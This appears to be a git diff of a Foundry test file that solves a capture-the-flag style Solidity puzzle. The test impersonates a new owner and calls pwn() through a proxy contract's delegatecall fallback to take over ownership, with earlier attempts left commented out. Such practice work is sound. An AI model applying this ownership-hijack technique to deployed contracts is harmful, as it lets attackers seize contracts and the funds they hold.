@@ -19,13 +19,18 @@ contract DelegateTest is Test {
     }
 
     function test_stealownership() public {
-        Delegate newDelegate = Delegate(address(delegation));
-        assertEq(delegate.owner(), Owner);
+        vm.startPrank(NewOwner);
+        Delegate delegateNew = Delegate(address(delegation));
+        delegateNew.pwn();
+        assertEq(NewOwner, delegation.owner());
+        vm.stopPrank();
+        
+        // assertEq(delegate.owner(), Owner);
 
-        // vm.prank(address(newDelegate));
-        newDelegate.pwn();
+        // vm.prank(NewOwner);
+        // delegation.pwn();
 
-        assertEq(delegate.owner(), address(delegate));
+        // assertEq(delegate.owner(), NewOwner);
 
 
     }
